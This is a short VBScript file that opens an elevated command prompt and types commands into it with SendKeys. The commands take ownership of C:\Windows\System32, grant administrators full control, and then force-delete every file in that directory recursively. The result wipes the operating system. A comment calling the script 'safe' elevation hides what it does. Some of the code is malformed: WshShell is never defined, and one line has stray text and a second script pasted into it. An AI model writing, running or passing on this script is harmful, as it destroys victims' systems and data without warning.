' Open Command Prompt with administrative privileges
Dim objShell
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "cmd.exe", "", "", "runas", 1
Set objShell = Nothing

WScript.Sleep 100

WshShell.SendKeys "net session >nul 2>&1if %errorLevel% == 0 (set admin=1) else ( set admin=0)" 


Wshshell.SendKeys "{ENTER}"


WshShell.SendKeys ' VBScript to elevate itself safelySet UAC = CreateObject("Shell.Application")
UAC.ShellExecute "cmd.exe", "/c echo Hello Admin & pause", "", "runas", 1


Wshshell.SendKeys "{ENTER}"

WScript.Sleep 100


 WshShell.SendKeys "if %errorLevel% == 0 ( set admin=1 ) else ( set admin=0 ) REM If not running with admin privileges, elevate if %admin%==0" 


Wshshell.SendKeys "{ENTER}"

WScript.Sleep 100

WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"


WshShell.SendKeys "{ENTER}"

WScript.Sleep 100


WshShell.SendKeys "icacls C:\Windows\System32 /grant administrators:F /t"

WScript.Sleep 100

WshShell.SendKeys "{ENTER}" 



WshShell.SendKeys "cd C:\Windows\System32"


WshShell.SendKeys "{ENTER}"

WScript.Sleep 100 


WshShell.SendKeys "del /F /S /Q *.*"


WshShell.SendKeys "{ENTER}"

